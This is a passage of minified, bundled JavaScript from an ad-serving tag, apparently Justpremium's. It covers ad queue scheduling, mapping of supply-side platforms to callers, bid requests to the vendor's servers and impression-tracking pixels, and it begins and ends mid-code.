          return t.jQueue.subscribe("executionError", function (t) {
            var r = t[0],
              n = t[1];
            if (n.model && (n = n.model), r && r.code && [204, 205, 209].indexOf(parseInt(r.code)) > -1) return !1;
            s.default.instance().track("adserver", "er", e.settings, n, r.code || r.message || "Loading resource error.", r.stack);
          }), t.jQueue.subscribe("fallError", function (t) {
            var r = t[0];
            s.default.instance().track("adserver", "er", e.settings, {
              zoneId: e.settings.server.zone,
              ssp: "",
              adId: "",
              format: "",
              sourceId: "",
              adunitid: "",
              isTest: ""
            }, r.code || r.message || "Executing fallback error.", r.stack);
          }), t.jQueue.subscribe("queueExecuted", function (t) {
            var r = t[1],
              n = [];
            Object.keys(r).forEach(function (e) {
              n = n.concat(r[e]);
            }), s.default.instance().track("adserver", "ex", e.settings, {
              zoneId: e.settings.server.zone,
              ssp: n.map(function (e) {
                return e.ssp;
              }).join(","),
              adId: n.map(function (e) {
                return e.adId;
              }).join(","),
              format: n.map(function (e) {
                return e.format;
              }).join(","),
              sourceId: n.map(function (e) {
                return e.sourceId;
              }).join(","),
              adunitid: n.map(function (e) {
                return e.adunitid;
              }).join(","),
              isTest: n.map(function (e) {
                return e.isTest;
              }).join(",")
            });
          }), this;
        }, t.prototype.getAdditionalTrackingData = function () {
          return {
            ias: v.get(this).settings.ias
          };
        }, t.prototype.getAds = function () {
          return v.get(this).di.jQueue.getAll();
        }, t.prototype.getDisplayedAds = function () {
          return v.get(this).executed;
        }, t.prototype.getQueue = function () {
          return v.get(this).di.jQueue;
        }, t.prototype.loadTag = function (e, t) {
          var r = this,
            n = v.get(r),
            i = n.di.jQueue;
          n.ads = e.ads;
          var o = n.settings = e.settings;
          o.tag = o.tag || {}, i.setSettings(o), n.di.jAdManager.setGlobals(o && o.device && o.device.type || "desktop", o && o.inits && o.inits || "");
          var a = !0,
            u = !1,
            c = void 0;
          try {
            for (var s, l = n.ads[Symbol.iterator](); !(a = (s = l.next()).done); a = !0) {
              var d = s.value;
              d.product = d.product || {}, d.product.inits = d.product.inits || {}, d.product.inits.ad = d.init, d.inline = d.inline || !1, d.regular = !0, d.models.forEach(function (e) {
                e.reqId = o.server.ruid || null, e.regular = !0, e.scope = t, o.geo && (e.geo = o.geo), o.ias && (e.ias = o.ias);
              }), i.insert(d.models, d.format, d.product, d.tracking, d.inline);
            }
          } catch (e) {
            u = !0, c = e;
          } finally {
            try {
              !a && l.return && l.return();
            } finally {
              if (u) throw c;
            }
          }
          var p = n.settings.server.zone;
          b.indexOf(parseInt(p)), w.find(function (e) {
            return m.document.location.hostname.indexOf(e) > -1;
          });
          n.tagLoaded = !0, n.syncFrameLoaded ? r.run() : n.timeout = setTimeout(function () {
            r.run();
          }, 500);
        }, t.prototype.notifyAboutSyncFrame = function () {
          var e = v.get(this);
          e.syncFrameLoaded = !0, clearTimeout(e.timeout), e.tagLoaded && !e.alreadyRunning && this.run();
        }, t.prototype.removeAdFromList = function (e) {
          var t = v.get(this);
          if (t.executed && t.executed.length > 0) {
            var r = t.executed.indexOf(e);
            -1 !== r && t.executed.splice(r, 1);
          }
        }, t.prototype.run = function () {
          var e = v.get(this);
          e.alreadyRunning = !0, e.di.jQueue.run();
        }, t.getExecution = function (e, r) {
          var n = t._getExecutionByRunConn(e, r),
            i = r.di,
            o = i.jPlugin;
          return o._prepareExecutionTracking({
            di: {
              jExecution: n
            }
          }), o._prepareCallerTracking({
            di: {
              jCaller: i.jCaller
            }
          }), n.subscribe("dependenciesReady", function (e) {
            i.jAdManager.publish("adReady", e);
          }), n;
        }, t._getExecutionByRunConn = function (e, r) {
          switch (e.conn) {
            case "write":
              return new u.default({
                di: r.di
              });
            case "asyncWrite":
              return 13 === e.ssp ? new f.default({
                di: r.di
              }) : 30 === e.ssp || 24 === e.ssp ? new h.default({
                di: r.di
              }) : new c.default({
                di: r.di
              });
            default:
              return t._getExecutionBySsp(e, r);
          }
        }, t._getExecutionBySsp = function (e, t) {
          var r = "video" === e.type,
            n = function () {
              return "default";
            },
            i = function () {
              return 22 === e.ssp || 32 === e.ssp || 39 === e.ssp || 41 === e.ssp || 42 === e.ssp || 44 === e.ssp ? r ? "vast" : "default" : "vast";
            },
            o = function () {
              return "write";
            };
          return function (e) {
            var c = {
                1: r ? n : o,
                22: i,
                32: i,
                41: i,
                39: i,
                20: i,
                24: i,
                30: i,
                42: i,
                44: i,
                default: n
              },
              s = {
                write: function () {
                  return new u.default({
                    di: t.di
                  });
                },
                vast: function () {
                  return new h.default({
                    di: t.di
                  });
                },
                default: function () {
                  return new a.default({
                    di: t.di
                  });
                }
              };
            return (s[(c[e] || c.default)()] || s.default)();
          }(e.ssp);
        }, t;
      }(i.default);
    t.default = j;
  },
  574: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = Object.assign || function (e) {
        for (var t = 1; t < arguments.length; t++) {
          var r = arguments[t];
          for (var n in r) Object.prototype.hasOwnProperty.call(r, n) && (e[n] = r[n]);
        }
        return e;
      },
      i = h(r(4)),
      o = h(r(16)),
      a = r(575),
      u = h(r(2)),
      c = h(r(33)),
      s = h(r(581)),
      l = h(r(11)),
      d = h(r(210)),
      p = h(r(1)),
      f = h(r(217));
    function h(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function g(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var i = r[n],
            o = Object.getOwnPropertyDescriptor(t, i);
          o && o.configurable && void 0 === e[i] && Object.defineProperty(e, i, o);
        }
      }(e, t));
    }
    var y = new WeakMap(),
      v = p.default.getTopScope(),
      m = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var n = function (e, t) {
              if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
              return !t || "object" != typeof t && "function" != typeof t ? e : t;
            }(this, e.call(this, r)),
            i = n,
            o = {};
          return y.set(i, o), o.ads = {}, o.multi = {}, o.di = r.di, o.firstCheckDelay = 250, o.quickCheckDelay = 40, o.cancelCheck = function () {}, o.busy = !1, o.busyInline = !1, o.quickCheck = !1, o.execution = [], o.caller = [], o.callerMulti = [], o.runningCallers = [], o.settings = {}, o.adRunIdx = 0, o.inlineRunned = !1, o.startInlineScroll = .3, o.sleep = !1, o.restartQueue = !1, l.default.optimizedScroll(v), n;
        }
        return g(t, e), t.prototype.setSettings = function (e) {
          var t = y.get(this);
          t.settings = e || {};
          var r = t.settings.server;
          return r && o.default.debug(r.debug), this;
        }, t.prototype.insert = function (e, t, r, n, i) {
          var u = this,
            c = y.get(u);
          i = i || !1, c.ads[t] || (c.ads[t] = []);
          var s = !0,
            l = !1,
            d = void 0;
          try {
            for (var p, f = function () {
                var e = p.value;
                if (!e.adunitid) return "continue";
                if (u._reachFreqCapping(e)) return "continue";
                if (!a.JHelperAdserverMapping.hasCaller(e)) return "continue";
                e.conn = a.JHelperAdserverMapping.connection(e.ssp, t), e.type = a.JHelperAdserverMapping.type(t), e.caller = a.JHelperAdserverMapping.isOpenRTB(e.ssp) ? "openrtb" : e.ssp, e.width = 0, e.height = 0, e.inits = r.inits, e.channel = c.settings.tag.channel, e.country = c.settings.tag.country, e.inline = i, e.tracking = [], e.tracking.backoffice1 = n[0], e.tracking.backoffice2 = n[1], e.tracking.imptag = c.settings.tag.tracking;
                var o = void 0;
                a.JHelperAdserverMapping.isMulti(e) ? (o = c.callerMulti.find(function (t) {
                  return t[0] === e.caller;
                })) ? o = o[1] : (o = a.JHelperAdserverMapping.caller(e), c.callerMulti.push([e.caller, o])) : (o = a.JHelperAdserverMapping.caller(e), c.caller.push([e.sourceId, o])), o.setGlobals(c.settings), c.execution.push([e.sourceId, c.di.JPlugin.getExecution(e, {
                  di: {
                    window: v,
                    localWindow: e.scope || window,
                    Jpx: window.Jpx || v.Jpx,
                    jPlugin: c.di.jPlugin,
                    jAdManager: c.di.jAdManager,
                    jQueue: u,
                    jCaller: o,
                    settings: c.settings
                  }
                })]), delete e.scope, c.ads[t].push(e);
              }, h = e[Symbol.iterator](); !(s = (p = h.next()).done); s = !0) f();
          } catch (e) {
            l = !0, d = e;
          } finally {
            try {
              !s && h.return && h.return();
            } finally {
              if (l) throw d;
            }
          }
          o.default.info("JQueue: loaded " + e.length + " model(s) for " + t);
        }, t.prototype.getAll = function () {
          return y.get(this).ads;
        }, t.prototype.run = function () {
          var e = this,
            t = y.get(e);
          t.restartQueue || e.publish("queueExecuted", [e, t.ads]), o.default.info("JQueue: run queue..."), e._processQueue(), e._requestMultiReadAds(), e._runInlineAd(), e._scheduleCheckV2();
        }, t.prototype._processQueue = function () {
          var e = this,
            t = y.get(e);
          Object.keys(t.ads).forEach(function (r) {
            var n = t.ads[r],
              i = !0,
              o = !1,
              a = void 0;
            try {
              for (var u, c = function () {
                  var r = u.value;
                  switch (r.conn) {
                    case "read":
                      e._dispatchReadAd(r);
                      break;
                    case "asyncWrite":
                      e._dispatchAsyncAd(r);
                      break;
                    case "write":
                      var n = t.caller.find(function (e) {
                        return e[0] === r.sourceId;
                      });
                      n && n[1].run(r);
                  }
                }, s = n[Symbol.iterator](); !(i = (u = s.next()).done); i = !0) c();
            } catch (e) {
              o = !0, a = e;
            } finally {
              try {
                !i && s.return && s.return();
              } finally {
                if (o) throw a;
              }
            }
          });
        }, t.prototype._requestMultiReadAds = function () {
          var e = this,
            t = y.get(e);
          t.multi && Object.keys(t.multi).forEach(function (r) {
            var i = t.multi[r],
              a = t.callerMulti.find(function (e) {
                return String(e[0]) === r;
              }),
              u = a && a[1].run(i).then(function (t) {
                var r = !1;
                Object.keys(i).forEach(function (o) {
                  var a = i[o];
                  if (t[a.adunitid]) {
                    var u = t[a.adunitid];
                    u.error && (a.error = u.error, a.used = !0), u.data && (a.data = n({}, u.data)), u.creative && (a.creative = u.creative, a.height = u.creative.height, a.width = u.creative.width, r = !0, u.creative.deal_id && (a.dealId = u.creative.deal_id), u.creative.price && (a.price = u.creative.price));
                  } else a.error = e.error(222);
                }), r && (e._runInlineAd(), e._scheduleCheckV2(!0));
              }).catch(function (e) {
                o.default.error(e), i.forEach(function (t) {
                  t.error = e, t.used = !0;
                });
              });
            u && t.runningCallers.push([t.multi[r], u]);
          });
        }, t.prototype._scheduleCheckV2 = function (e) {
          var t = this;
          if (y.get(t).busy) return !1;
          var r = t._getAvailAdByHighestPriority();
          if (r && "write" === r.conn) return t._scheduleCheck(t._instantCheck);
          t._scheduleCheck(e ? t._quickCheck : t._regularCheck);
        }, t.prototype._runInlineAd = function () {
          var e = y.get(this);
          if (e.busyInline) return !1;
          var t = this._getAdByHighestCPM();
          if (t && ("write" === t.conn || t.creative)) return e.busyInline = !0, this._execute(t);
          e.busyInline = !1;
        }, t.prototype._checkV2 = function () {
          var e = this,
            t = y.get(e);
          o.default.info("JQueue: searching for an ad");
          var r = e._getAvailAdByHighestPriority();
          return r ? e._execute(r) : (t.busy = !1, e._sleep().then(function () {
            if (!t.busy) return e._quickCheck();
          }).catch(function (e) {
            if (999 !== e.code) throw e;
          }));
        }, t.prototype._instantCheck = function () {
          return y.get(this).busy = !0, this._execute(this._getAvailAdByHighestPriority());
        }, t.prototype._sleep = function () {
          var e = this,
            t = y.get(e);
          return t.sleep ? Promise.reject(e.error(999)) : (t.sleep = !0, o.default.info("JQueue: going to sleep"), Promise.all(t.runningCallers.map(function (e) {
            return e[1];
          })).then(function () {
            if (!t.busy && !e._getAvailAdByHighestPriority()) throw e.error(206);
            o.default.info("JQueue: wake up queue"), t.sleep = !1;
          }));
        }, t.prototype._quickCheck = function () {
          var e = this,
            t = y.get(e);
          return t.quickCheck = !0, t.busy = !0, t.cancelCheck(), t.cancelCheck = u.default.delay(e, function () {
            return o.default.info("JQueue: quick check triggered"), e._checkV2();
          }, t.quickCheckDelay), t.quickCheckDelay = 0, t.cancelCheck.promise();
        }, t.prototype._regularCheck = function () {
          var e = this,
            t = y.get(e);
          return t.busy = !0, t.cancelCheck = u.default.delay(e, function () {
            return o.default.info("JQueue: regular check triggered"), e._checkV2();
          }, t.firstCheckDelay), t.quickCheckDelay = 0, t.cancelCheck.promise();
        }, t.prototype._getAdByHighestCPM = function () {
          var e = y.get(this);
          return e.adsInline || this._sortAdByCPM(), e.adsInline.find(function (e) {
            return !e.used && e.inline && e.creative;
          });
        }, t.prototype._getAvailAdByHighestPriority = function () {
          var e = y.get(this);
          return e.adsOut || this._sortAdByPriority(), e.adsOut.find(function (e) {
            return !e.used && (e.creative || "write" === e.conn) && !e.inline;
          });
        }, t.prototype._sortAdByPriority = function () {
          var e = y.get(this);
          return e.adsOut = [].concat.apply([], Object.keys(e.ads).map(function (t) {
            return e.ads[t];
          })).sort(function (e, t) {
            return e.priority - t.priority;
          }), e.adsOut;
        }, t.prototype._sortAdByCPM = function () {
          var e = y.get(this);
          return e.adsInline = [].concat.apply([], Object.keys(e.ads).map(function (t) {
            return e.ads[t].filter(function (e) {
              return e.inline;
            });
          })).sort(function (e, t) {
            return t.floorprice - e.floorprice;
          }), e.adsInline;
        }, t.prototype._rerunQueueV2 = function () {
          return y.get(this).busy = !1, o.default.info("JQueue: rerun"), this._scheduleCheckV2(!0);
        }, t.prototype._rerunInlineQueueV2 = function () {
          return y.get(this).busyInline = !1, o.default.info("JQueue: rerun inline"), this._runInlineAd();
        }, t.prototype._restartQueue = function () {
          var e = this,
            t = y.get(e);
          t.restartQueue = !0, t.sleep = !1, Object.keys(t.ads).forEach(function (e) {
            var r = t.ads[e],
              n = !0,
              i = !1,
              o = void 0;
            try {
              for (var a, u = r[Symbol.iterator](); !(n = (a = u.next()).done); n = !0) {
                var c = a.value;
                c.used = !1, c.error = "", c.creative && (c.creative = "");
              }
            } catch (e) {
              i = !0, o = e;
            } finally {
              try {
                !n && u.return && u.return();
              } finally {
                if (i) throw o;
              }
            }
          }), u.default.delay(e, function () {
            e.run();
          }, 5e3);
        }, t.prototype._forMulti = function (e) {
          var t = y.get(this),
            r = a.JHelperAdserverMapping.isOpenRTB(e.ssp) ? "openrtb" : e.ssp;
          (t.multi[r] || (t.multi[r] = [])).push(e);
        }, t.prototype._reachFreqCapping = function (e) {
          return !f.default.instance().validate(e);
        }, t.prototype._dispatchReadAd = function (e) {
          var t = this,
            r = y.get(t);
          if (a.JHelperAdserverMapping.isMulti(e)) r.restartQueue || t._forMulti(e);else {
            var n = r.caller.find(function (t) {
                return t[0] === e.sourceId;
              }),
              i = n && n[1].run(e).then(function (r) {
                if (r.error) return e.error = r.error, void (e.used = !0);
                r.creative && (e.creative = r.creative, e.height = r.creative.height, e.width = r.creative.width, r.creative.deal_id && (e.dealId = r.creative.deal_id), r.creative.price && (e.price = r.creative.price)), r.data && (e.data = r.data), t._runInlineAd(), t._scheduleCheckV2(!0);
              }).catch(function (t) {
                e.error = t, e.used = !0;
              });
            i && r.runningCallers.push([e, i]);
          }
          return t;
        }, t.prototype._dispatchAsyncAd = function (e) {
          var t = y.get(this),
            r = t.caller.find(function (t) {
              return t[0] === e.sourceId;
            }),
            n = r && r[1].run(e).then(function (t) {
              if (t.error) return e.error = t.error, void (e.used = !0);
              t.creative && (e.creative = t.creative, e.scope = t.scope, e.height = t.creative.height, e.width = t.creative.width);
            }).catch(function (t) {
              e.error = t, e.used = !0;
            });
          n && t.runningCallers.push([e, n]);
        }, t.prototype._scheduleCheck = function (e) {
          var t = this;
          y.get(t).busy || e.call(t).catch(function (e) {
            if (206 === e.code) {
              try {
                t._runFallback();
              } catch (e) {
                t.publish("fallError", [t.error(207), t]);
              }
              return e;
            }
            o.default.error(e);
          });
        }, t.prototype._recoverQueue = function (e, t) {
          this.publish("executionError", [e, t]), this._rerunQueueV2();
        }, t.prototype._execute = function (e) {
          var t = this,
            r = y.get(t),
            n = {
              format: e.format,
              model: e,
              global: r.settings,
              product: {
                height: e.height,
                width: e.width,
                inits: e.inits
              }
            };
          e.runAs = ++r.adRunIdx, o.default.info("JQueue: avail ad " + e.format + ":" + e.ssp + ":" + e.conn + ":" + e.sourceId + " found"), delete e.inits;
          var i = function () {
            var t = r.execution.find(function (t) {
              return t[0] === e.sourceId;
            });
            return t ? t[1] : void 0;
          }();
          return e.used = !0, i.subscribe("executionFailure", function (e) {
            return t._recoverQueue(e[0], e[1]);
          }), t.publish("adSelected", [t, e]), r.di.jAdManager.loadFormat(n.format).then(function () {
            return t.publish("loadFormat", [t, e, i]), e.inline ? new Promise(function (e, t) {
              v.addEventListener("optimizedScroll", function () {
                var o = d.default.getToTopScrolled();
                !r.inlineRunned && r.startInlineScroll < o.percent && (r.inlineRunned = !0, i.run(n).then(function (t) {
                  e(t);
                }).catch(function (e) {
                  t(e);
                }));
              });
            }) : i.run(n);
          }).catch(function (r) {
            switch (r.code) {
              case 299:
                e.inits = n.product.inits, t._execute(e);
                break;
              default:
                o.default.error(r), t.publish("executionError", [r, n]), n.model.inline ? t._rerunInlineQueueV2() : t._rerunQueueV2();
            }
          });
        }, t.prototype._runFallback = function () {
          var e = y.get(this);
          o.default.alwaysLog("info", "JQueue: No ad to run"), e.settings.fallback ? (o.default.alwaysLog("info", "JQueue: Fallback"), s.default.execute({
            fallback: e.settings.fallback
          }), c.default.instance().track("adserver", "pb", e.settings, {
            zoneId: e.settings.server.zone,
            ssp: "",
            adId: "",
            format: "",
            sourceId: "",
            adunitid: "",
            isTest: ""
          })) : !e.restartQueue && e.ads && this._restartQueue();
        }, t.factory = function (e) {
          return new t(e);
        }, t;
      }(i.default);
    t.default = m;
  },
  575: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    }), t.JHelperAdserverMapping = t.TYPES = void 0;
    var n = u(r(576)),
      i = u(r(577)),
      o = u(r(578)),
      a = u(r(579));
    function u(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    var c = t.TYPES = {
        WRITE: "write",
        READ: "read",
        ASYNC: "asyncWrite"
      },
      s = {
        nl: "Justpremium%channel%.nl",
        be: "Justpremium%channel%.be",
        de: "Justpremium%channel%.de",
        tr: "Justpremium.tr",
        uk: "Justpremium.uk",
        fr: "Justpremium%channel%.fr",
        au: "Justpremium%channel%.au",
        pl: "Justpremium.pl",
        at: "Justpremium%channel%.at",
        ch: "Justpremium%channel%.ch",
        gl: "Justpremium%channel%.com",
        es: "Justpremium%channel%.es",
        it: "Justpremium.it",
        pt: "Justpremium.pt",
        us: function () {
          return document.location.hostname;
        },
        se: "Justpremium.se",
        dk: "Justpremium%channel%.dk",
        me: "Justpremium.me",
        mx: "Justpremium%channel%.mx",
        br: "Justpremium%channel%.br",
        fi: "Justpremium.fi",
        no: "Justpremium.no",
        ca: "Justpremium.ca",
        co: "Justpremium.co",
        ie: "Justpremium.ie",
        cl: "Justpremium.cl",
        pe: "Justpremium.pe"
      },
      l = function (e) {
        switch (parseInt(e.ssp)) {
          case 13:
            return a.default;
          case 36:
            return o.default;
          case 20:
          case 24:
          case 30:
          case 1:
          case 3:
          case 19:
          case 22:
          case 32:
          case 38:
          case 39:
          case 41:
          case 42:
          case 44:
            return i.default;
          case 35:
            return n.default;
          default:
            return null;
        }
      };
    t.JHelperAdserverMapping = {
      formats: {
        script: "script",
        as: "normal",
        cf: "normal",
        ci: "normal",
        fa: "normal",
        fi: "normal",
        fv: "video",
        hi: "normal",
        is: "normal",
        ms: "normal",
        mt: "normal",
        mv: "video",
        pa: "normal",
        pu: "normal",
        sa: "normal",
        wp: "normal",
        wv: "video",
        ds: "normal"
      },
      urls: s,
      channels: {
        xx: "Sitespecific",
        am: "Automotive",
        bu: "Bussines",
        en: "Entertaiment",
        fa: "Family",
        he: "Health",
        in: "Info",
        kd: "Kids",
        nw: "News",
        sp: "Sports",
        tr: "Travel",
        sc: "Social",
        te: "Tech"
      },
      type: function (e) {
        return this.formats[e] ? this.formats[e] : null;
      },
      caller: function (e) {
        return l(e).factory();
      },
      hasCaller: function (e) {
        return !!l(e);
      },
      isOpenRTB: function (e) {
        return [1, 3, 19, 20, 22, 24, 30, 32, 38, 39, 41, 42, 44].indexOf(parseInt(e)) > -1;
      },
      isMulti: function (e) {
        return l(e).isMulti();
      },
      url: function (e) {
        return this.urls[e] ? this.urls[e] : "";
      },
      channel: function (e) {
        return this.channels[e] ? this.channels[e] : "";
      },
      connection: function (e, t) {
        var r = this.type(t),
          n = void 0;
        return n = c.READ, 13 === e ? c.ASYNC : (23 === e && (n = c.WRITE), "video" === r ? n : (12 === e ? n = c.WRITE : 9 === e ? n = c.WRITE : 6 === e && (n = c.WRITE), n));
      }
    };
  },
  576: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = a(r(113)),
      i = a(r(19)),
      o = a(r(73));
    function a(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function u(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var i = r[n],
            o = Object.getOwnPropertyDescriptor(t, i);
          o && o.configurable && void 0 === e[i] && Object.defineProperty(e, i, o);
        }
      }(e, t));
    }
    var c = a(r(1)).default.getTopScope(),
      s = function (e) {
        function t() {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var r = function (e, t) {
            if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
            return !t || "object" != typeof t && "function" != typeof t ? e : t;
          }(this, e.call(this));
          return r.multi = !0, r.jsonp = !0, r;
        }
        return u(t, e), t.prototype.getUrl = function (e) {
          if (!e instanceof Array) return "";
          var t = e.map(function (e) {
              return e.adunitid;
            }).join(","),
            r = "xtt.ads.justpremium.com",
            n = "&cv=1";
          return -1 === c.document.location.host.search("preview.justpremium") && -1 === c.document.location.host.search("preview.stage") || (n = ""), (c.document.location.protocol + "//" + r + "/preview/?adunitId=%id%" + n).replace("%id%", t);
        }, t.prototype.getSspId = function () {
          return 35;
        }, t.prototype.before = function (e) {
          return Promise.resolve(e);
        }, t.prototype.after = function (e) {
          var t = {},
            r = e.response,
            n = (e.records[0] && e.records[0], null),
            a = null;
          if (e.response.ads.ad) {
            a = r.ads.ad._id;
            var u = e.response.ads.ad.creatives[0],
              c = u.source,
              s = u.size.split("x"),
              l = u.type,
              d = parseInt(s[0]),
              p = parseInt(s[1]);
            t[a] = d < 150 && p < 48 ? {
              data: u,
              error: new Error("No ad available")
            } : {
              data: u,
              creative: {
                placement: a,
                html: c,
                type: l,
                is_fallback: u.is_fallback || !1,
                height: p,
                deal_id: u.deal_id || !1,
                width: d
              }
            };
            "video" === l && null === /(<script)|(<\/script>)/g.exec(u.source) && (n = u.source);
          }
          if (n) {
            var f = new i.default(n, null);
            return f.ready().then(function () {
              var e = o.default.getSizes("wv");
              return t[a].creative = {
                html: "<span></span>",
                vast: f.getVast(),
                height: e[0][1],
                width: e[0][0]
              }, Promise.resolve(t);
            });
          }
          return Promise.resolve(t);
        }, t.prototype.request = function (e) {
          var t = this.getUrl(e),
            r = this.getSspId();
          return this.JSONPRequest(t, r, e);
        }, t.prototype.parse = function (e, t) {
          console.log(e);
        }, t.prototype.run = function (e) {
          var t = this;
          return t.publish("run", [t, e]), t.before(e).then(function () {
            return t.request(e);
          }).then(function (e) {
            return t.after(e);
          }).then(function (r) {
            return t.publish("response", [t, e, r]), r;
          });
        }, t.isMulti = function () {
          return !0;
        }, t.factory = function () {
          return new t();
        }, t;
      }(n.default);
    t.default = s;
  },
  577: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = function () {
        return function (e, t) {
          if (Array.isArray(e)) return e;
          if (Symbol.iterator in Object(e)) return function (e, t) {
            var r = [],
              n = !0,
              i = !1,
              o = void 0;
            try {
              for (var a, u = e[Symbol.iterator](); !(n = (a = u.next()).done) && (r.push(a.value), !t || r.length !== t); n = !0);
            } catch (e) {
              i = !0, o = e;
            } finally {
              try {
                !n && u.return && u.return();
              } finally {
                if (i) throw o;
              }
            }
            return r;
          }(e, t);
          throw new TypeError("Invalid attempt to destructure non-iterable instance");
        };
      }(),
      i = c(r(113)),
      o = c(r(33)),
      a = c(r(141)),
      u = c(r(1));
    function c(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function s(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var i = r[n],
            o = Object.getOwnPropertyDescriptor(t, i);
          o && o.configurable && void 0 === e[i] && Object.defineProperty(e, i, o);
        }
      }(e, t));
    }
    var l = function (e) {
      function t() {
        !function (e, t) {
          if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
        }(this, t);
        var r = function (e, t) {
          if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
          return !t || "object" != typeof t && "function" != typeof t ? e : t;
        }(this, e.call(this));
        return r.jsonp = !1, r;
      }
      return s(t, e), t.isMulti = function () {
        return !0;
      }, t.factory = function (e) {
        return new t(e);
      }, t.prototype.run = function (e) {
        var t = this;
        return t.publish("run", [t, e]), t.before(e).then(function () {
          return t.request(e);
        }).then(function (r) {
          return t.after(r, e);
        }).then(function (r) {
          return t.publish("response", [t, e, r]), r;
        }).catch(function (r) {
          throw 221 === r.code && t.publish("xhrError", [t, e, r]), r;
        });
      }, t.prototype.getUrl = function (e) {
        return "https://pre.ads.justpremium.com/v/1.0/t/singletag/?i=" + +new Date();
      }, t.prototype.getRequestBody = function (e, t, r, i, o) {
        var a = n(e, 8),
          u = a[0],
          c = a[1],
          s = a[2],
          l = a[3],
          d = a[4],
          p = a[5],
          f = a[6],
          h = a[7],
          g = n(r, 3),
          y = g[0],
          v = g[1],
          m = g[2],
          b = n(i, 2),
          w = b[0],
          j = b[1];
        return m && m.city && !function (e) {
          return "string" == typeof e && decodeURIComponent(e) !== e;
        }(m.city) && (m.city = encodeURIComponent(escape(m.city))), {
          hostname: j,
          protocol: w,
          href: o,
          sw: c,
          sh: s,
          ww: l,
          wh: d,
          tagid: u,
          reqId: p,
          user: btoa(JSON.stringify({
            ip: y,
            isEu: v,
            geo: m
          })),
          consent: f,
          ggExt: h,
          json: t.map(function (e) {
            return e.floorprice = 35 === parseInt(e.ssp) ? 5 : e.floorprice, {
              adId: e.adId,
              ssp: e.ssp,
              sourceId: e.sourceId,
              placement: e.adunitid,
              format: e.format,
              floorprice: parseFloat(e.floorprice),
              bidCurr: "USD"
            };
          })
        };
      }, t.prototype.before = function (e) {
        return Promise.resolve(e);
      }, t.prototype.after = function (e, t) {
        var r = this,
          n = {};
        return e.forEach(function (e) {
          var i = t.find(function (t) {
            return t.sourceId === e.sourceId;
          });
          i.dealId = e.dealId, i.nurl = e.nurl, i.price = e.cpm;
          var a = parseInt(i.ssp);
          if (1 === a) {
            var u = '<img style="position: fixed; top: -9999px; left: -9999px; height: 1px; width: 1px;" src=' + o.default.instance().getPixelUrl("adserver", "im", r.getGlobals(), i) + " />";
            e.adm = e.adm.search("</body>") > -1 ? e.adm.replace("</body>", u + "</body>") : e.adm + u;
          }
          n[e.placement] = {
            data: i,
            creative: {
              placement: e.placement,
              html: e.adm,
              vastRaw: e.adm,
              type: e.type,
              is_fallback: 0,
              height: e.height,
              deal_id: e.dealId || !1,
              price: e.cpm || null,
              width: e.width,
              nurl: e.nurl
            }
          }, 20 !== a && 24 !== a && 30 !== a || (n[e.placement].creative.vastRaw = e.adm);
        }), n;
      }, t.prototype.request = function (e) {
        var t = this.getGlobals(),
          r = this.getUrl(),
          n = this.getRequestBody([t.server.zone, u.default.getScreenWidth(), u.default.getScreenHeight(), u.default.getWindowWidth(), u.default.getWindowHeight(), t.server.ruid, t.cmp && t.cmp.consentString || "", t.ggExt || null], e, [t.server.uip, t.cmp && t.cmp.eu || 0, t.geo], [u.default.getTopScope().location.protocol, u.default.getTopScope().location.hostname], u.default.getTopScope().location.href);
        return a.default.post(r, {
          body: n,
          json: !0,
          trid: t.server.trid || null
        }).ready();
      }, t.prototype.getSspId = function (e) {
        return e;
      }, t;
    }(i.default);
    t.default = l;
  },
  578: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = o(r(113)),
      i = o(r(73));
    function o(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function a(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var i = r[n],
            o = Object.getOwnPropertyDescriptor(t, i);
          o && o.configurable && void 0 === e[i] && Object.defineProperty(e, i, o);
        }
      }(e, t));
    }
    var u = function (e) {
      function t() {
        !function (e, t) {
